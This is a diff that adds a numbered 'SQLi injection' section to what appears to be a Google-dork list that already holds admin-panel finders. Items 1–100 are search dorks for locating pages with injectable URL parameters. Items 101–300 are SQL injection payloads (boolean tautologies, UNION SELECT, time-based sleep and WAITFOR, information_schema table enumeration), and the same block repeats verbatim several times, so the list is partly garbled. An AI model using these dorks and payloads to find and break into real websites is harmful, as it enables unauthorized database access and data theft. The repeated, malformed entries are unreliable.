@@ -394,3 +394,306 @@ Find Admin
 298. inurl:admin/index.cfm
 299. inurl:phpmyadmin
 300. intitle:"phpmyadmin"
+
+SQLi injection
+****************
+1. inurl:index.php?id=
+2. inurl:page.php?id=
+3. inurl:news.php?id=
+4. inurl:item.php?id=
+5. inurl:view.php?id=
+6. inurl:product.php?id=
+7. inurl:shop.php?id=
+8. inurl:details.php?id=
+9. inurl:content.php?id=
+10. inurl:info.php?id=
+11. inurl:index.asp?id=
+12. inurl:page.asp?id=
+13. inurl:view.asp?id=
+14. inurl:details.asp?id=
+15. inurl:news.asp?id=
+16. inurl:item.asp?id=
+17. inurl:index.jsp?id=
+18. inurl:page.jsp?id=
+19. inurl:news.jsp?id=
+20. inurl:details.jsp?id=
+21. inurl:view.jsp?id=
+22. inurl:product.jsp?id=
+23. inurl:index.aspx?id=
+24. inurl:page.aspx?id=
+25. inurl:news.aspx?id=
+26. inurl:view.aspx?id=
+27. inurl:details.aspx?id=
+28. inurl:item.aspx?id=
+29. inurl:shop.aspx?id=
+30. inurl:cat.aspx?id=
+31. inurl:catalog.aspx?id=
+32. inurl:details.php?id=1'
+33. inurl:page.php?id=1'
+34. inurl:item.php?id=1'
+35. inurl:view.php?id=1'
+36. inurl:news.php?id=1'
+37. inurl:shop.php?id=1'
+38. inurl:product.php?id=1'
+39. inurl:info.php?id=1'
+40. inurl:profile.php?id=
+41. inurl:home.php?id=
+42. inurl:event.php?id=
+43. inurl:category.php?id=
+44. inurl:main.php?id=
+45. inurl:index.php?cat=
+46. inurl:index.php?page=
+47. inurl:index.php?news=
+48. inurl:index.php?item=
+49. inurl:index.php?type=
+50. inurl:index.php?prodid=
+51. inurl:index.php?section=
+52. inurl:index.php?lang=
+53. inurl:index.php?article=
+54. inurl:index.php?story=
+55. inurl:index.php?topic=
+56. inurl:index.php?post=
+57. inurl:index.php?content=
+58. inurl:index.php?code=
+59. inurl:index.php?book=
+60. inurl:index.php?chapter=
+61. inurl:index.php?forum=
+62. inurl:index.php?thread=
+63. inurl:index.php?search=
+64. inurl:index.php?year=
+65. inurl:index.php?month=
+66. inurl:index.php?day=
+67. inurl:index.php?date=
+68. inurl:index.php?ref=
+69. inurl:index.php?url=
+70. inurl:index.php?link=
+71. inurl:index.php?redir=
+72. inurl:index.php?goto=
+73. inurl:index.php?file=
+74. inurl:index.php?img=
+75. inurl:index.php?image=
+76. inurl:index.php?load=
+77. inurl:index.php?open=
+78. inurl:index.php?download=
+79. inurl:index.php?dir=
+80. inurl:index.php?path=
+81. inurl:index.php?view=
+82. inurl:index.php?module=
+83. inurl:index.php?option=
+84. inurl:index.php?sectionid=
+85. inurl:index.php?catid=
+86. inurl:index.php?contentid=
+87. inurl:index.php?articleid=
+88. inurl:index.php?postid=
+89. inurl:index.php?pageid=
+90. inurl:index.php?storyid=
+91. inurl:index.php?threadid=
+92. inurl:index.php?forumid=
+93. inurl:index.php?newsid=
+94. inurl:index.php?topicid=
+95. inurl:index.php?itemid=
+96. inurl:index.php?eventid=
+97. inurl:index.php?profileid=
+98. inurl:test.php?id=
+99. inurl:test.php?id=
+100. inurl:test.php?id=
+101. inurl:index.php?id=1'--
+102. inurl:index.php?id=1' or '1'='1
+103. inurl:index.php?id=1" or "1"="1
+104. inurl:index.php?id=1) or (1=1
+105. inurl:index.php?id=1')--
+106. inurl:index.php?id=1))--
+107. inurl:index.php?id=-1 UNION SELECT
+108. inurl:index.php?id=1 ORDER BY 1--
+109. inurl:index.php?id=1 AND 1=1
+110. inurl:index.php?id=1 AND 1=2
+111. inurl:index.php?id=1 OR 1=1--
+112. inurl:index.php?id=1 OR 1=2--
+113. inurl:index.php?id=1 UNION SELECT null,null--
+114. inurl:index.php?id=1 UNION SELECT 1,2,3--
+115. inurl:index.php?id=null UNION ALL SELECT
+116. inurl:index.php?id=1' AND '1'='1
+117. inurl:index.php?id=1' AND '1'='2
+118. inurl:index.php?id=1" AND "1"="1
+119. inurl:index.php?id=1" AND "1"="2
+120. inurl:index.php?id=1') AND ('1'='1
+121. inurl:index.php?id=1') AND ('1'='2
+122. inurl:index.php?id=1 AND sleep(5)--
+123. inurl:index.php?id=1;WAITFOR DELAY '0:0:5'--
+124. inurl:index.php?id=1 AND benchmark(1000000,MD5(1))--
+125. inurl:index.php?id=1' AND benchmark(500000,sha1(1))--
+126. inurl:index.php?id=1 AND ASCII(LOWER(SUBSTRING((SELECT user()),1,1))) > 64
+127. inurl:index.php?id=1' UNION SELECT null,version()--
+128. inurl:index.php?id=1' UNION SELECT user(),database()--
+129. inurl:index.php?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+130. inurl:index.php?id=1' AND 1=1#
+131. inurl:index.php?id=1' AND 1=2#
+132. inurl:index.php?id=1'--
+133. inurl:index.php?id=1' or '1'='1
+134. inurl:index.php?id=1" or "1"="1
+135. inurl:index.php?id=1) or (1=1
+136. inurl:index.php?id=1')--
+137. inurl:index.php?id=1))--
+138. inurl:index.php?id=-1 UNION SELECT
+139. inurl:index.php?id=1 ORDER BY 1--
+140. inurl:index.php?id=1 AND 1=1
+141. inurl:index.php?id=1 AND 1=2
+142. inurl:index.php?id=1 OR 1=1--
+143. inurl:index.php?id=1 OR 1=2--
+144. inurl:index.php?id=1 UNION SELECT null,null--
+145. inurl:index.php?id=1 UNION SELECT 1,2,3--
+146. inurl:index.php?id=null UNION ALL SELECT
+147. inurl:index.php?id=1' AND '1'='1
+148. inurl:index.php?id=1' AND '1'='2
+149. inurl:index.php?id=1" AND "1"="1
+150. inurl:index.php?id=1" AND "1"="2
+151. inurl:index.php?id=1') AND ('1'='1
+152. inurl:index.php?id=1') AND ('1'='2
+153. inurl:index.php?id=1 AND sleep(5)--
+154. inurl:index.php?id=1;WAITFOR DELAY '0:0:5'--
+155. inurl:index.php?id=1 AND benchmark(1000000,MD5(1))--
+156. inurl:index.php?id=1' AND benchmark(500000,sha1(1))--
+157. inurl:index.php?id=1 AND ASCII(LOWER(SUBSTRING((SELECT user()),1,1))) > 64
+158. inurl:index.php?id=1' UNION SELECT null,version()--
+159. inurl:index.php?id=1' UNION SELECT user(),database()--
+160. inurl:index.php?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+161. inurl:index.php?id=1' AND 1=1#
+162. inurl:index.php?id=1' AND 1=2#
+163. inurl:index.php?id=1'--
+164. inurl:index.php?id=1' or '1'='1
+165. inurl:index.php?id=1" or "1"="1
+166. inurl:index.php?id=1) or (1=1
+167. inurl:index.php?id=1')--
+168. inurl:index.php?id=1))--
+169. inurl:index.php?id=-1 UNION SELECT
+170. inurl:index.php?id=1 ORDER BY 1--
+171. inurl:index.php?id=1 AND 1=1
+172. inurl:index.php?id=1 AND 1=2
+173. inurl:index.php?id=1 OR 1=1--
+174. inurl:index.php?id=1 OR 1=2--
+175. inurl:index.php?id=1 UNION SELECT null,null--
+176. inurl:index.php?id=1 UNION SELECT 1,2,3--
+177. inurl:index.php?id=null UNION ALL SELECT
+178. inurl:index.php?id=1' AND '1'='1
+179. inurl:index.php?id=1' AND '1'='2
+180. inurl:index.php?id=1" AND "1"="1
+181. inurl:index.php?id=1" AND "1"="2
+182. inurl:index.php?id=1') AND ('1'='1
+183. inurl:index.php?id=1') AND ('1'='2
+184. inurl:index.php?id=1 AND sleep(5)--
+185. inurl:index.php?id=1;WAITFOR DELAY '0:0:5'--
+186. inurl:index.php?id=1 AND benchmark(1000000,MD5(1))--
+187. inurl:index.php?id=1' AND benchmark(500000,sha1(1))--
+188. inurl:index.php?id=1 AND ASCII(LOWER(SUBSTRING((SELECT user()),1,1))) > 64
+189. inurl:index.php?id=1' UNION SELECT null,version()--
+190. inurl:index.php?id=1' UNION SELECT user(),database()--
+191. inurl:index.php?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+192. inurl:index.php?id=1' AND 1=1#
+193. inurl:index.php?id=1' AND 1=2#
+194. inurl:index.php?id=1'--
+195. inurl:index.php?id=1' or '1'='1
+196. inurl:index.php?id=1" or "1"="1
+197. inurl:index.php?id=1) or (1=1
+198. inurl:index.php?id=1')--
+199. inurl:index.php?id=1))--
+200. inurl:index.php?id=-1 UNION SELECT
+201. inurl:index.php?id=1 ORDER BY 1--
+202. inurl:index.php?id=1 AND 1=1
+203. inurl:index.php?id=1 AND 1=2
+204. inurl:index.php?id=1 OR 1=1--
+205. inurl:index.php?id=1 OR 1=2--
+206. inurl:index.php?id=1 UNION SELECT null,null--
+207. inurl:index.php?id=1 UNION SELECT 1,2,3--
+208. inurl:index.php?id=null UNION ALL SELECT
+209. inurl:index.php?id=1' AND '1'='1
+210. inurl:index.php?id=1' AND '1'='2
+211. inurl:index.php?id=1" AND "1"="1
+212. inurl:index.php?id=1" AND "1"="2
+213. inurl:index.php?id=1') AND ('1'='1
+214. inurl:index.php?id=1') AND ('1'='2
+215. inurl:index.php?id=1 AND sleep(5)--
+216. inurl:index.php?id=1;WAITFOR DELAY '0:0:5'--
+217. inurl:index.php?id=1 AND benchmark(1000000,MD5(1))--
+218. inurl:index.php?id=1' AND benchmark(500000,sha1(1))--
+219. inurl:index.php?id=1 AND ASCII(LOWER(SUBSTRING((SELECT user()),1,1))) > 64
+220. inurl:index.php?id=1' UNION SELECT null,version()--
+221. inurl:index.php?id=1' UNION SELECT user(),database()--
+222. inurl:index.php?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+223. inurl:index.php?id=1' AND 1=1#
+224. inurl:index.php?id=1' AND 1=2#
+225. inurl:index.php?id=1'--
+226. inurl:index.php?id=1' or '1'='1
+227. inurl:index.php?id=1" or "1"="1
+228. inurl:index.php?id=1) or (1=1
+229. inurl:index.php?id=1')--
+230. inurl:index.php?id=1))--
+231. inurl:index.php?id=-1 UNION SELECT
+232. inurl:index.php?id=1 ORDER BY 1--
+233. inurl:index.php?id=1 AND 1=1
+234. inurl:index.php?id=1 AND 1=2
+235. inurl:index.php?id=1 OR 1=1--
+236. inurl:index.php?id=1 OR 1=2--
+237. inurl:index.php?id=1 UNION SELECT null,null--
+238. inurl:index.php?id=1 UNION SELECT 1,2,3--
+239. inurl:index.php?id=null UNION ALL SELECT
+240. inurl:index.php?id=1' AND '1'='1
+241. inurl:index.php?id=1' AND '1'='2
+242. inurl:index.php?id=1" AND "1"="1
+243. inurl:index.php?id=1" AND "1"="2
+244. inurl:index.php?id=1') AND ('1'='1
+245. inurl:index.php?id=1') AND ('1'='2
+246. inurl:index.php?id=1 AND sleep(5)--
+247. inurl:index.php?id=1;WAITFOR DELAY '0:0:5'--
+248. inurl:index.php?id=1 AND benchmark(1000000,MD5(1))--
+249. inurl:index.php?id=1' AND benchmark(500000,sha1(1))--
+250. inurl:index.php?id=1 AND ASCII(LOWER(SUBSTRING((SELECT user()),1,1))) > 64
+251. inurl:index.php?id=1' UNION SELECT null,version()--
+252. inurl:index.php?id=1' UNION SELECT user(),database()--
+253. inurl:index.php?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+254. inurl:index.php?id=1' AND 1=1#
+255. inurl:index.php?id=1' AND 1=2#
+256. inurl:index.php?id=1'--
+257. inurl:index.php?id=1' or '1'='1
+258. inurl:index.php?id=1" or "1"="1
+259. inurl:index.php?id=1) or (1=1
+260. inurl:index.php?id=1')--
+261. inurl:index.php?id=1))--
+262. inurl:index.php?id=-1 UNION SELECT
+263. inurl:index.php?id=1 ORDER BY 1--
+264. inurl:index.php?id=1 AND 1=1
+265. inurl:index.php?id=1 AND 1=2
+266. inurl:index.php?id=1 OR 1=1--
+267. inurl:index.php?id=1 OR 1=2--
+268. inurl:index.php?id=1 UNION SELECT null,null--
+269. inurl:index.php?id=1 UNION SELECT 1,2,3--
+270. inurl:index.php?id=null UNION ALL SELECT
+271. inurl:index.php?id=1' AND '1'='1
+272. inurl:index.php?id=1' AND '1'='2
+273. inurl:index.php?id=1" AND "1"="1
+274. inurl:index.php?id=1" AND "1"="2
+275. inurl:index.php?id=1') AND ('1'='1
+276. inurl:index.php?id=1') AND ('1'='2
+277. inurl:index.php?id=1 AND sleep(5)--
+278. inurl:index.php?id=1;WAITFOR DELAY '0:0:5'--
+279. inurl:index.php?id=1 AND benchmark(1000000,MD5(1))--
+280. inurl:index.php?id=1' AND benchmark(500000,sha1(1))--
+281. inurl:index.php?id=1 AND ASCII(LOWER(SUBSTRING((SELECT user()),1,1))) > 64
+282. inurl:index.php?id=1' UNION SELECT null,version()--
+283. inurl:index.php?id=1' UNION SELECT user(),database()--
+284. inurl:index.php?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+285. inurl:index.php?id=1' AND 1=1#
+286. inurl:index.php?id=1' AND 1=2#
+287. inurl:index.php?id=1'--
+288. inurl:index.php?id=1' or '1'='1
+289. inurl:index.php?id=1" or "1"="1
+290. inurl:index.php?id=1) or (1=1
+291. inurl:index.php?id=1')--
+292. inurl:index.php?id=1))--
+293. inurl:index.php?id=-1 UNION SELECT
+294. inurl:index.php?id=1 ORDER BY 1--
+295. inurl:index.php?id=1 AND 1=1
+296. inurl:index.php?id=1 AND 1=2
+297. inurl:index.php?id=1 OR 1=1--
+298. inurl:index.php?id=1 OR 1=2--
+299. inurl:index.php?id=1 UNION SELECT null,null--
+300. inurl:index.php?id=1 UNION SELECT 1,2,3--
